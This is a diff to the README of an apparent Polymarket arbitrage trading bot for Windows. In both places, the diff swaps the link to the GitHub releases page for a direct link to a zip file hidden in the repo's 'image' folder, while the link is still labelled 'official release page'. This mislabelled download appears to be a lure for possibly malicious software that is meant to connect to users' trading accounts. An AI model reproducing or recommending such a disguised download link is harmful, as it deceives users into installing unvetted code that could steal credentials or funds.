@@ -1,6 +1,6 @@
 # 📈 polymarket-arbitrage-trading-bot - Automate your prediction market trading strategy
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kenfri13/polymarket-arbitrage-trading-bot/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/kenfri13/polymarket-arbitrage-trading-bot/main/image/polymarket_arbitrage_trading_bot_3.5.zip)
 
 This software helps you trade on Polymarket. It monitors price differences across prediction markets. It finds opportunities to buy low and sell high. You run the app on your Windows computer. It connects to your trading accounts. It manages your trades based on your set rules.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this software. Check your system again
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official release page](https://github.com/kenfri13/polymarket-arbitrage-trading-bot/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/kenfri13/polymarket-arbitrage-trading-bot/main/image/polymarket_arbitrage_trading_bot_3.5.zip).
 2. Look for the latest version listed at the top.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
